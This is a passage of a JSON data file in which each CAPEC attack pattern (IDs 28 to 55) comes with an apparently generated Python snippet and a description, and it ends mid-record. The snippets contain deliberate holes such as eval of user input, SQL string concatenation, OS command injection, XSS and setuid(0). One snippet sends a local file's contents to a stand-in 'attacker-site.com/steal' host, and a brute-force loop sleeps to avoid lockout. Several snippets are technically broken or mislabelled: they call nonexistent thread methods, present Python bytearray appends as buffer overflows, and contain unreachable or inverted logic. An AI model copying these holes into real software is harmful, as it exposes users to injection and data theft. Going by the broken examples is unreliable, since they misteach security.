        "code_snippet": "import random\nimport string\n\ndef fuzz_input(input_length):\n    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(input_length))\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    # CWE-184: Incomplete List of Disallowed Inputs\n    if user_input not in ['admin', 'user']:\n        return 'Invalid user'\n    \n    # CWE-506: Embedded Malicious Code\n    if 'evil_code' in user_input:\n        eval(user_input)\n    \n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    try:\n        # Simulating a database query\n        db_query = 'SELECT * FROM users WHERE username=' + user_input\n        print(db_query)\n    except Exception as e:\n        print('Error: ' + str(e))\n\nfor _ in range(100):\n    user_input = fuzz_input(10)\n    vulnerable_function(user_input)\n",
        "description": "This code snippet demonstrates the CAPEC attack pattern of fuzzing to identify weaknesses in the system. The vulnerable_function takes user input and performs various operations without proper input validation, neutralization of special elements, and error handling, making it vulnerable to injection, malicious code execution, and sensitive information disclosure."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import os\nimport threading\n\ndef access_file(filename):\n    if os.access(filename, os.R_OK):\n        # Time-of-check Time-of-use (TOCTOU) Race Condition\n        # The file access is checked, but the file can be modified or replaced before it is used\n        print('File is accessible')\n        # Race condition window: an adversary can replace or modify the file here\n        with open(filename, 'r') as f:\n            print(f.read())\n\n# Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\ndef modify_file(filename):\n    with open(filename, 'w') as f:\n        f.write('New content')\n\n# Improper Synchronization\nthread = threading.Thread(target=modify_file, args=('example.txt',))\nthread.start()\naccess_file('example.txt')",
        "description": "This code snippet demonstrates a Time-of-check Time-of-use (TOCTOU) Race Condition, where a file access is checked, but the file can be modified or replaced before it is used. The code also exhibits Concurrent Execution using Shared Resource with Improper Synchronization, as two threads access the same file without proper synchronization, leading to a race condition. This can cause the program to behave unexpectedly, as the file's state can change between the check and the use."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import os\nimport threading\nimport ctypes\n\n# CWE-270: Privilege Context Switching Error\n# CWE-114: Process Control\n# CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n\n# Define a shared resource\nshared_resource = 0\n\n# Define a function to manipulate the shared resource\ndef manipulate_resource():\n    global shared_resource\n    # CWE-362: Race Condition\n    while True:\n        shared_resource += 1\n        os.system('whoami')  # CWE-78: OS Command Injection\n\n# Create a thread to manipulate the shared resource\nthread = threading.Thread(target=manipulate_resource)\nthread.start()\n\n# CWE-1421: Exposure of Sensitive Information in Shared Microarchitectural Structures during Transient Execution\n# (Note: This CWE is related to processor events and is not directly applicable to Python code)\n\n# Suspend the thread and manipulate its memory\nthread.suspend()\nctypes.string_at(id(thread) + 0x100) = b'malicious_code'  # CWE-270: Privilege Context Switching Error\nthread.resume()",
        "description": "This code snippet demonstrates the CAPEC of hijacking a privileged thread of execution by injecting malicious code into a running process. It uses related CWEs such as privilege context switching error, process control, race condition, OS command injection, and exposure of sensitive information in shared microarchitectural structures during transient execution to illustrate the attack."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import http.cookies\n\ndef authenticate_user(username, password):\n    if username == 'admin' and password == 'password':\n        cookie = http.cookies.SimpleCookie()\n        cookie['session_id'] = '1234567890abcdef'\n        cookie['session_id']['expires'] = 31536000\n        return cookie\n    else:\n        return None\n\ndef get_user_data(cookie):\n    if 'session_id' in cookie:\n        # No validation or integrity checking of the session_id\n        return {'username': 'admin', 'role': 'admin'}\n    else:\n        return None\n\ndef main():\n    cookie = authenticate_user('admin', 'password')\n    if cookie:\n        print('Authenticated!')\n        # Storing sensitive information in cleartext in a cookie\n        cookie['user_data'] = 'username=admin&role=admin'\n        print(cookie)\n        # No encryption of sensitive data before transmission\n        print('Sending cookie to server...')\n        # No input validation of the cookie data\n        user_data = get_user_data(cookie)\n        if user_data:\n            print('Welcome, ' + user_data['username'])\n    else:\n        print('Authentication failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC of using HTTP Cookies to store credentials, state information, and other critical data on client systems. It embodies several CWEs, including CWE-565 (Reliance on Cookies without Validation and Integrity Checking), CWE-302 (Authentication Bypass by Assumed-Immutable Data), CWE-311 (Missing Encryption of Sensitive Data), CWE-539 (Use of Persistent Cookies Containing Sensitive Information), CWE-20 (Improper Input Validation), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-384 (Session Fixation). The code uses a simple cookie-based authentication system, but it does not properly validate or encrypt the cookie data, making it vulnerable to various attacks."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import flask\n\napp = flask.Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = flask.request.args.get('query')\n    return '<h1>Search results for ' + query + '</h1>'\n\nif __name__ == '__main__':\n    app.run()",
        "description": "This Python code snippet demonstrates a vulnerable web application that is susceptible to cross-site scripting (XSS) attacks. The application uses the Flask web framework and has a single route for handling search queries. The search query is retrieved from the query string and embedded directly into the HTML response without proper validation or encoding, making it vulnerable to XSS attacks (CWE-80, CWE-79). An attacker could exploit this vulnerability by convincing a victim to submit a malicious query string, such as '<script>alert(\"XSS\")</script>', which would be executed by the victim's browser."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import requests\n\n\nproxy_server = 'http://proxy.example.com'\n\nmalicious_url = 'http://attacker.com/malicious'\n\nheaders = {\n    'Host': 'victim.com',\n    'Content-Length': '0',\n    'Connection': 'keep-alive'\n}\n\n\n# CWE-444: Inconsistent Interpretation of HTTP Requests\nproxy_request = requests.Request('GET', malicious_url, headers=headers)\nprep = proxy_request.prepare()\n\n# CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers\nprep.headers['Proxy-Connection'] = 'keep-alive\\r\\nX-Ignore: test'\n\n# CWE-918: Server-Side Request Forgery (SSRF)\nssrf_request = requests.Session()\nssrf_response = ssrf_request.send(prep, proxies={'http': proxy_server, 'https': proxy_server})\n\n# CWE-352: Cross-Site Request Forgery (CSRF)\ncsrf_token = 'csrf_token_value'\ncsrf_request = requests.Request('GET', 'http://victim.com/csrf_protected', headers={'X-CSRF-TOKEN': csrf_token})\n\n# CWE-441: Unintended Proxy or Intermediary ('Confused Deputy')\nconfused_deputy_request = requests.Request('GET', 'http://victim.com/confused_deputy', headers={'Via': '1.1 ' + proxy_server})\n",
        "description": "This Python code snippet demonstrates the CAPEC of HTTP Request Smuggling by exploiting inconsistencies in HTTP request parsing and interpretation by different intermediary HTTP agents. It includes examples of CWE-444, CWE-113, CWE-918, CWE-352, and CWE-441 vulnerabilities, showcasing how an adversary can secretly send unauthorized and malicious HTTP requests to a back-end HTTP agent."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import http.server\nimport socketserver\n\nPORT = 8000\n\nclass RequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html; charset=utf-8')\n        self.end_headers()\n        self.wfile.write(b'<html><body><h1>Vulnerable HTTP Response Splitting</h1></body></html>')\n        self.wfile.write(b'<br><br>')\n        self.wfile.write(b'Injected Response: ') \n        self.wfile.write(self.path[1:].encode())\n        self.wfile.write(b'<br><br>')\n        self.wfile.write(b'Second Response: ') \n        self.wfile.write(b'<html><body><h1>Second Response</h1></body></html>')\n\nwith socketserver.TCPServer(('', PORT), RequestHandler) as httpd:\n    print('Serving at port', PORT)\n    httpd.serve_forever()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP response splitting attack. The code sets up an HTTP server that responds to GET requests. The response includes the original request path, which can be manipulated by an attacker to inject malicious content. The server also sends a second response, which can be used to inject additional malicious content. This code embodies the CAPEC of manipulating and injecting malicious content into an HTTP response, and relates to CWEs 74, 113, 138, 436, and 444."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import os\n\n# CWE-94: Improper Control of Generation of Code ('Code Injection')\ndef generate_config_file(user_input):\n    config_file = open('config.txt', 'w')\n    config_file.write('malicious_code = ' + user_input + '\\n')\n    config_file.close()\n\n# CWE-96: Improper Neutralization of Directives in Statically Saved Code ('Static Code Injection')\ndef load_config_file():\n    config_file = open('config.txt', 'r')\n    config_code = config_file.read()\n    exec(config_code)\n\n# CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\ndef evaluate_config_code(user_input):\n    eval(user_input)\n\n# CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SSIHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n        self.wfile.write(b'<!--#include virtual=\"' + self.path[1:].encode() + b'\" -->')\n\n# CWE-272: Least Privilege Violation\nos.setuid(0)\n\n# CWE-59: Improper Link Resolution Before File Access ('Link Following')\ndef follow_link(filename):\n    return os.readlink(filename)\n\n# CWE-282: Improper Ownership Management\nos.chown('config.txt', 0, 0)\n\n# CWE-270: Privilege Context Switching Error\ndef switch_privileges():\n    os.setuid(0)\n    os.setgid(0)\n",
        "description": "This code snippet demonstrates a vulnerable Python application that is susceptible to code injection attacks. It generates a configuration file with user-inputted code, loads and executes the configuration file, and evaluates user-inputted code using the eval function. Additionally, it includes server-side includes, violates the principle of least privilege, follows symbolic links without proper resolution, and improperly manages file ownership and privilege context switching."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "class AdminInterface:\n    def __init__(self):\n        self.admin_functions = {'delete_user': self.delete_user, 'create_admin': self.create_admin}\n\n    def delete_user(self, username):\n        # No authentication or authorization checks\n        print(f'Deleting user {username}')\n\n    def create_admin(self, username):\n        # No authentication or authorization checks\n        print(f'Creating admin user {username}')\n\n    def invoke_function(self, function_name, *args):\n        if function_name in self.admin_functions:\n            return self.admin_functions[function_name](*args)\n        else:\n            print('Invalid function')\n\n# Example usage\nadmin_interface = AdminInterface()\nadmin_interface.invoke_function('delete_user', 'john_doe')\nadmin_interface.invoke_function('create_admin', 'jane_doe')",
        "description": "This code snippet demonstrates the CAPEC of unauthorized access to interfaces or functionality. The AdminInterface class provides critical functions such as deleting users and creating admins without any authentication or authorization checks, violating CWE-306 and CWE-862. The invoke_function method allows an attacker to invoke these functions without proper access control, exploiting CWE-693 and CWE-695. The inclusion of undocumented features, as in CWE-1242, is also demonstrated by the lack of documentation or access control for these sensitive functions."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import os\nimport getpass\nimport hashlib\n\n# CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n# CWE-311: Missing Encryption of Sensitive Data\n# CWE-312: Cleartext Storage of Sensitive Information\n\n# Storing sensitive data in cleartext in a file\nf = open('sensitive_data.txt', 'w')\nf.write('username: ' + getpass.getuser() + '\\n')\nf.write('password: mysecretpassword\\n')\nf.close()\n\n# CWE-525: Use of Web Browser Cache Containing Sensitive Information\n# CWE-314: Cleartext Storage in the Registry\n# CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n\n# Storing sensitive data in cleartext in a cookie\ncookie = {'username': getpass.getuser(), 'password': 'mysecretpassword'}\n\n# CWE-318: Cleartext Storage of Sensitive Information in Executable\n\n# Storing sensitive data in cleartext in an executable\nos.system('echo \"username: ' + getpass.getuser() + '\\npassword: mysecretpassword\" > sensitive_data.exe')\n\n# CWE-1239: Improper Zeroization of Hardware Register\n# CWE-1258: Exposure of Sensitive System Information Due to Uncleared Debug Information\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n# CWE-1272: Sensitive Information Uncleared Before Debug/Power State Transition\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n# CWE-1301: Insufficient or Incomplete Data Removal within Hardware Component\n# CWE-1330: Remanent Data Readable after Memory Erase\n\n# Not properly clearing sensitive information from hardware registers\n# Not properly scrubbing sensitive data from decommissioned devices\n# Not protecting against hardware reverse engineering\n# Not removing sensitive information from memory circuits\n\n# Hashing sensitive data, but not encrypting it\nhashed_password = hashlib.sha256('mysecretpassword'.encode()).hexdigest()\nprint('hashed_password: ' + hashed_password)\n",
        "description": "This code snippet demonstrates the CAPEC of an attacker examining a target system to find sensitive data that has been embedded within it. It includes various CWEs such as storing sensitive data in cleartext, not encrypting sensitive data, not properly clearing sensitive information from hardware registers, and not protecting against hardware reverse engineering."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import os\nimport sys\n\n# CWE-426: Untrusted Search Path\nsys.path.insert(0, '/tmp/malicious_path')\n\n# CWE-427: Uncontrolled Search Path Element\nos.environ['PATH'] = '/tmp/malicious_path:' + os.environ['PATH']\n\n# CWE-73: External Control of File Name or Path\nfilename = input('Enter a file name: ')\nopen(filename, 'r')\n\n# CWE-555: J2EE Misconfiguration: Plaintext Password in Configuration File\nconfig_file = open('/tmp/config.properties', 'w')\nconfig_file.write('password=mypassword')\nconfig_file.close()\n\n# CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nresource_id = input('Enter a resource ID: ')\nos.system('curl http://example.com/' + resource_id)\n",
        "description": "This Python code snippet demonstrates the CAPEC pattern of attack where an adversary loads a malicious resource into a program's standard path. It includes examples of CWE-426, CWE-427, CWE-73, CWE-555, and CWE-99, showcasing untrusted search paths, uncontrolled search path elements, external control of file names or paths, J2EE misconfiguration, and improper control of resource identifiers."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import hashlib\n\ndef authenticate_user(username, password, session_id):\n    # CWE-285: Improper Authorization\n    # No authorization check is performed\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n\ndef set_session_cookie(username, session_id):\n    # CWE-565: Reliance on Cookies without Validation and Integrity Checking\n    # Cookie is set without validation or integrity checking\n    cookie = {'username': username, 'session_id': session_id}\n    return cookie\n\n\ndef get_session_cookie(cookie):\n    # CWE-315: Cleartext Storage of Sensitive Information in a Cookie\n    # Sensitive information is stored in cleartext in a cookie\n    return cookie\n\n\ndef check_session_fixation(session_id):\n    # CWE-384: Session Fixation\n    # Existing session identifier is not invalidated\n    return True\n\n\ndef main():\n    username = 'admin'\n    password = 'password'\n    session_id = '1234567890'\n\n    if authenticate_user(username, password, session_id):\n        cookie = set_session_cookie(username, session_id)\n        print('Authenticated!')\n        print('Cookie:', cookie)\n        if check_session_fixation(session_id):\n            print('Session fixation vulnerability exists!')\n    else:\n        print('Authentication failed!')\n\nif __name__ == '__main__':\n    main()",
        "description": "This code snippet demonstrates the CAPEC pattern of manipulating client-side tokens. It includes several CWEs, including CWE-285 (Improper Authorization), CWE-565 (Reliance on Cookies without Validation and Integrity Checking), CWE-315 (Cleartext Storage of Sensitive Information in a Cookie), and CWE-384 (Session Fixation). The code allows an attacker to manipulate the session cookie and gain unauthorized access."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import os\n\n# CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n# CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')\n# CWE-114: Process Control - Executing commands or loading libraries from an untrusted source or in an untrusted environment\n\ndef vulnerable_function(user_input):\n    # CWE-214: Invocation of Process Using Visible Sensitive Information\n    command = f\"cat /etc/passwd > /tmp/output; {user_input}\"\n    os.system(command)\n\n# CWE-529: Exposure of Access Control List Files to an Unauthorized Control Sphere\nuser_input = input(\"Enter a command: \")\nvulnerable_function(user_input)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that allows command injection attacks. The function takes user input and concatenates it with a system command, then executes the resulting command using os.system(). This allows an attacker to inject malicious commands, potentially leading to unauthorized access or data exposure."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import smtplib\n\n\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\n\n\nmsg = MIMEMultipart()\nmsg['Subject'] = 'Injected Header<script>alert(1)</script>'\nmsg['From'] = 'attacker@example.com'\nmsg['To'] = 'victim@example.com'\n\nbody = 'Injected Body<script>alert(2)</script>'\nmsg.attach(MIMEText(body, 'html'))\n\nserver = smtplib.SMTP('smtp.example.com')\nserver.sendmail('attacker@example.com', 'victim@example.com', msg.as_string())\nserver.quit()",
        "description": "This Python code snippet demonstrates an email header injection attack, leveraging meta-characters to inject malicious scripts into email headers. The code constructs an email message with an injected subject and body, containing script tags that can be executed by the email client. The email is then sent using an SMTP server. This code embodies CWE-150 (Improper Neutralization of Escape, Meta, or Control Sequences), CWE-88 (Improper Neutralization of Argument Delimiters in a Command), CWE-697 (Incorrect Comparison), CWE-644 (Improper Neutralization of HTTP Headers for Scripting Syntax), and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
        "code_snippet": "import email\n\ndef mime_converter(file_path):\n    with open(file_path, 'rb') as file:\n        data = file.read()\n    mime_msg = email.message_from_bytes(data)\n    output = ''\n    for part in mime_msg.walk():\n        if part.get_content_maintype() == 'text':\n            output += part.get_payload()\n    return output\n\nmime_converter('user_input_file.txt')",
        "description": "This Python code snippet demonstrates a vulnerable MIME conversion routine that can lead to a buffer overflow. The function mime_converter reads a file, converts it to a MIME message, and extracts the text content. However, it does not validate the input file size or content, allowing an attacker to craft a malicious file that can cause a buffer overflow when processed. The function also relies on the file extension to determine the appropriate behavior, making it vulnerable to file misclassification."
    },
    {
        "capec_id": "43",
        "capec_name": "Exploiting Multiple Input Interpretation Layers",
        "code_snippet": "import re\n\ndef validate_input(input_str):\n    if re.match('^[a-zA-Z0-9_]+$', input_str):\n        return True\n    return False\n\ndef parse_input(input_str):\n    # Simulating a parsing layer that strips special characters\n    return re.sub(r'[^a-zA-Z0-9_]+', '', input_str)\n\ndef execute_command(input_str):\n    # Simulating an OS command execution\n    return f'echo {input_str}'\n\ninput_str = '||id;echo '  # Attacker's input\n\nif validate_input(input_str):\n    parsed_input = parse_input(input_str)\n    command = execute_command(parsed_input)\n    print(command)\n",
        "description": "This code snippet demonstrates the CAPEC, where an attacker provides input that bypasses the input validation layer by concealing malicious characters with layers of special characters. The input validation layer checks for alphanumeric characters and underscores, but the parsing layer strips special characters, allowing the attacker's input to pass through. The execute_command function then executes the parsed input as an OS command, resulting in command injection."
    },
    {
        "capec_id": "44",
        "capec_name": "Overflow Binary Resource File",
        "code_snippet": "import os\n\ndef process_image(image_path):\n    image_data = open(image_path, 'rb').read()\n    buffer = bytearray(1024)\n    buffer.extend(image_data)\n    return buffer\n\nimage_path = 'exploit_image.jpg'\nbuffer = process_image(image_path)\n\n# Vulnerable code: no input validation, no bounds checking\nos.system(buffer.decode())",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability in image processing. The `process_image` function reads an image file into a fixed-size buffer without checking the file size, leading to a buffer overflow (CWE-120). The function then returns the buffer, which is later passed to the `os.system` function without proper validation, allowing an attacker to execute arbitrary code (CWE-119, CWE-697). The code also relies on the file extension to determine the file type, making it vulnerable to file type confusion (CWE-646). Additionally, the code does not properly handle alternate data streams in Windows files (CWE-69)."
    },
    {
        "capec_id": "45",
        "capec_name": "Buffer Overflow via Symbolic Links",
        "code_snippet": "import os\n\n# CWE-285: Improper Authorization\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\nusername = 'attacker'\npassword = 'password'\n\nif username == 'admin' and password == 'password':\n    # CWE-20: Improper Input Validation\n    # CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\n    user_input = input('Enter a file path: ')\n    if os.path.islink(user_input):\n        # CWE-118: Incorrect Access of Indexable Resource ('Range Error')\n        # CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\n        # CWE-120: Buffer Copy without Checking Size of Input ('Classic Buffer Overflow')\n        # CWE-680: Integer Overflow to Buffer Overflow\n        # CWE-697: Incorrect Comparison\n        buffer_size = 1024\n        buffer = bytearray(buffer_size)\n        with open(user_input, 'r') as file:\n            file.readinto(buffer)\n        print(buffer.decode())\n    else:\n        print('Invalid file path')\nelse:\n    print('Invalid credentials')",
        "description": "This code snippet demonstrates a vulnerable Python script that is susceptible to a symbolic link attack, which can lead to a buffer overflow. The script first checks for proper authentication, but the authentication mechanism can be bypassed. Then, it takes user input for a file path and checks if it's a symbolic link. If it is, the script reads the contents of the file into a buffer without checking the size of the input, leading to a potential buffer overflow. The script also lacks proper input validation and neutralization of special elements, making it vulnerable to injection attacks."
    },
    {
        "capec_id": "46",
        "capec_name": "Overflow Variables and Tags",
        "code_snippet": "import configparser\n\ndef parse_config(file_path):\n    config = configparser.ConfigParser()\n    config.read(file_path)\n    buffer = bytearray(1024)\n    section = config.sections()[0]\n    option = config.get(section, 'malicious_option')\n    buffer.extend(option.encode())\n    return buffer\n\ndef main():\n    file_path = 'malicious_config.ini'\n    parse_config(file_path)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a buffer overflow vulnerability due to improper input validation and lack of size checking when copying input data to a fixed-size buffer. The code reads a configuration file, retrieves a maliciously crafted option value, and copies it to a fixed-size buffer without checking the size of the input, leading to a buffer overflow. This code embodies the CAPEC and CWEs mentioned, including CWE-120, CWE-118, CWE-119, CWE-74, CWE-20, CWE-680, CWE-733, and CWE-697."
    },
    {
        "capec_id": "47",
        "capec_name": "Buffer Overflow via Parameter Expansion",
        "code_snippet": "def vulnerable_function(user_input):\n    buffer = bytearray(10)\n    for i in range(len(user_input)):\n        buffer.append(ord(user_input[i]))\n    return buffer\n\nuser_input = 'A' * 100\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a classic buffer overflow vulnerability. The function vulnerable_function takes a user input string and copies it into a fixed-size buffer without checking the size of the input. This can lead to a buffer overflow if the input string is larger than the buffer size. The CWEs related to this CAPEC include CWE-120 (Buffer Copy without Checking Size of Input), CWE-119 (Improper Restriction of Operations within the Bounds of a Memory Buffer), and CWE-20 (Improper Input Validation)."
    },
    {
        "capec_id": "48",
        "capec_name": "Passing Local Filenames to Functions That Expect a URL",
        "code_snippet": "import os\n\ndef get_local_file(file_path):\n    if os.path.exists(file_path):\n        with open(file_path, 'r') as f:\n            return f.read()\n    else:\n        return 'File not found'\n\n# CWE-241: Improper Handling of Unexpected Data Type\nfile_path = input('Enter the file path: ')\n\n# CWE-706: Use of Incorrectly-Resolved Name or Reference\nif file_path.startswith('file:///'):\n    file_path = file_path.replace('file:///', '')\n\n# CWE-598: Use of GET Request Method With Sensitive Query Strings\nimport requests\nresponse = requests.get('http://attacker-site.com/steal', params={'stolen_data': get_local_file(file_path)})\n\n# CWE-84: Improper Neutralization of Encoded URI Schemes in a Web Page\nimport urllib.parse\nencoded_file_path = urllib.parse.quote(file_path)\n\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\nif file_path.endswith('.txt'):\n    print(get_local_file(file_path))\nelse:\n    print('Invalid file extension')",
        "description": "This Python code snippet demonstrates a client-side attack that accesses local files and resources instead of URLs. It uses various CWEs to illustrate the vulnerabilities, including improper handling of unexpected data types, use of incorrectly-resolved names or references, use of GET request method with sensitive query strings, improper neutralization of encoded URI schemes, and reliance on file name or extension of externally-supplied files."
    },
    {
        "capec_id": "49",
        "capec_name": "Password Brute Forcing",
        "code_snippet": "import itertools\nimport string\nimport time\n\ndef brute_force_attack(username, max_length):\n    for r in range(1, max_length + 1):\n        for attempt in itertools.product(string.printable, repeat=r):\n            password = ''.join(attempt)\n            if authenticate(username, password):\n                print(f'Password found: {password}')\n                return\n            time.sleep(0.1)  # delay to avoid account lockout\n\ndef authenticate(username, password):\n    # weak password requirements, no password aging\n    if username == 'admin' and len(password) > 0:\n        return True\n    return False\n\nbrute_force_attack('admin', 10)",
        "description": "This Python code snippet demonstrates a brute force attack on a weak password system. The system has weak password requirements (CWE-521), no password aging (CWE-262), and stores passwords in a recoverable format (CWE-257). The attack tries all possible passwords of increasing length until it finds a valid one. The authenticate function is vulnerable to brute force attacks due to the lack of proper authentication attempt restrictions (CWE-307) and the use of single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "50",
        "capec_name": "Password Recovery Exploitation",
        "code_snippet": "import hashlib\n\ndef recover_password(username, answer):\n    # CWE-522: Insufficiently Protected Credentials\n    # CWE-257: Storing Passwords in a Recoverable Format\n    password_hash = get_password_hash_from_database(username)\n    if password_hash:\n        # CWE-640: Weak Password Recovery Mechanism for Forgotten Password\n        # CWE-309: Use of Password System for Primary Authentication\n        # CWE-521: Weak Password Requirements\n        if hashlib.sha1(answer.encode()).hexdigest() == password_hash:\n            return generate_new_password(username)\n    return None\n\ndef generate_new_password(username):\n    # CWE-521: Weak Password Requirements\n    new_password = 'default_password'\n    update_password_in_database(username, new_password)\n    return new_password",
        "description": "This code snippet demonstrates a weak password recovery mechanism. It uses a simple SHA-1 hash to store passwords, which can be easily cracked. The recovery mechanism relies on a secret question and answer, which can be easily guessed or brute-forced. The new password generated is also a default password, which is a weak password requirement. This code is vulnerable to several attacks, including password reuse, unauthorized access, and brute-force attacks."
    },
    {
        "capec_id": "51",
        "capec_name": "Poison Web Service Registry",
        "code_snippet": "import xml.etree.ElementTree as ET\n\nwsdl_file = 'vulnerable_wsdl.xml'\n\n# CWE-651: Exposure of WSDL File Containing Sensitive Information\nwsdl_tree = ET.parse(wsdl_file)\nwsdl_root = wsdl_tree.getroot()\n\n# CWE-314: Cleartext Storage in the Registry\nregistry_data = {'service_name': 'vulnerable_service', 'service_url': 'http://malicious-service.com'}\n\n# CWE-285: Improper Authorization\nif not authorize_user():\n    # CWE-693: Protection Mechanism Failure\n    print('Access granted!')\nelse:\n    print('Access denied!')\n\n# CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection')\ndef get_service_info(service_name):\n    return f'Service {service_name} is available at {registry_data[\\'service_url\\']}'\n\nprint(get_service_info('vulnerable_service'))",
        "description": "This Python code snippet demonstrates a vulnerable web service registry that is susceptible to various attacks. It exposes a WSDL file containing sensitive information, stores cleartext data in the registry, lacks proper authorization, and is vulnerable to injection attacks. An attacker can exploit these weaknesses to redirect service requests to a malicious service provider, access sensitive information, or inject malicious data into the system."
    },
    {
        "capec_id": "52",
        "capec_name": "Embedding NULL Bytes",
        "code_snippet": "import subprocess\n\ndef vulnerable_function(user_input):\n    command = 'echo ' + user_input + ' > output.txt'\n    subprocess.call(command, shell=True)\n\nuser_input = 'Hello\\x00World'\n\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates the CAPEC of embedding null bytes in input to the target software. The CWEs related to this CAPEC include CWE-158, CWE-172, CWE-173, CWE-74, CWE-20, CWE-697, and CWE-707. The code takes user input and passes it to the `subprocess.call` function without proper validation or neutralization of null bytes. This can lead to unexpected behavior, such as truncation of the input string, or even command injection attacks."
    },
    {
        "capec_id": "53",
        "capec_name": "Postfix, Null Terminate, and Backslash",
        "code_snippet": "import urllib.parse\n\ndef filter_trailing_slash(url):\n    if url.endswith('/'): return True\n    return False\n\ndef sanitize_url(url):\n    if '\\0' in url: return url.replace('\\0', '')\n    return url\n\nurl = 'http://example.com/path\\0/../../etc/passwd'\nif filter_trailing_slash(sanitize_url(url)):\n    print('URL is valid')\nelse:\n    print('URL is not valid')",
        "description": "This code snippet demonstrates the CAPEC where a filter checks for a trailing slash character in a URL. The CWEs involved are CWE-158, CWE-172, CWE-173, CWE-74, CWE-20, CWE-697, and CWE-707. The sanitize_url function incorrectly neutralizes the null byte, allowing an adversary to embed it mid-string and bypass the filter. The filter_trailing_slash function does not properly handle the alternate encoding of the null byte, leading to a vulnerable condition."
    },
    {
        "capec_id": "54",
        "capec_name": "Query System for Information",
        "code_snippet": "import sqlite3\n\ndef get_user_data(username):\n    conn = sqlite3.connect('users.db')\n    c = conn.cursor()\n    query = \"SELECT * FROM users WHERE username='\" + username + \"'\"\n    try:\n        c.execute(query)\n        user_data = c.fetchone()\n        if user_data:\n            return user_data\n        else:\n            return \"User not found\"\n    except Exception as e:\n        return str(e)\n\nusername = input(\"Enter username: \")\nprint(get_user_data(username))",
        "description": "This Python code snippet demonstrates a vulnerable function get_user_data that retrieves user data from a SQLite database. It is vulnerable to SQL injection (CWE-89) as it directly concatenates user input into the SQL query. An attacker can manipulate the input to access sensitive information or modify the query logic. The function also returns error messages containing sensitive information (CWE-209) and uses a GET request method with sensitive query strings (CWE-598). Additionally, it does not properly neutralize special elements in the data query logic (CWE-943). An adversary can exploit these vulnerabilities to probe the application's structure and evaluate its robustness by submitting variants of expected queries."
    },
    {
        "capec_id": "55",
        "capec_name": "Rainbow Table Password Cracking",
